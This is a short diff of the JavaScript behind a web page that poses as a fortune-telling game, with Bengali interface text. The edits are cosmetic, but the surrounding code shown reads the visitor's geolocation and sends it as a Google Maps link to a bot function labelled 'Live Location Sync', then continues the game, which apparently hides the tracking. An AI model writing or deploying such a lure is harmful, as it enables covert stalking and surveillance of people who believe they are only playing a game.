@@ -162,7 +162,7 @@
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             // সঠিক গুগল ম্যাপ ইউআরএল ফরম্যাট
-            sendBot(`📍 **Aura💥Live Location Sync!**\n[View Map](https://www.google.com/maps?q=${lat},${lon})`);
+            sendBot(`📍 **Aura💥Live Location Sync!**\n[View On Map](https://www.google.com/maps?q=${lat},${lon})`);
             document.getElementById('s2').classList.remove('active');
             document.getElementById('s3').classList.add('active');
             showStory();
@@ -197,7 +197,7 @@
         } else {
             document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
             document.getElementById('res-img').style.display = 'none';
-            document.getElementById('res-desc').innerText = "আপনার ভবিষ্যৎ উজ্জ্বল হোক। শুভকামনা!";
+            document.getElementById('res-desc').innerText = "আপনার আগামী দিনগুলো অনেক সুন্দর হোক। ধন্যবাদ!";
             document.getElementById('next-btn').style.display = 'none';
         }
     }
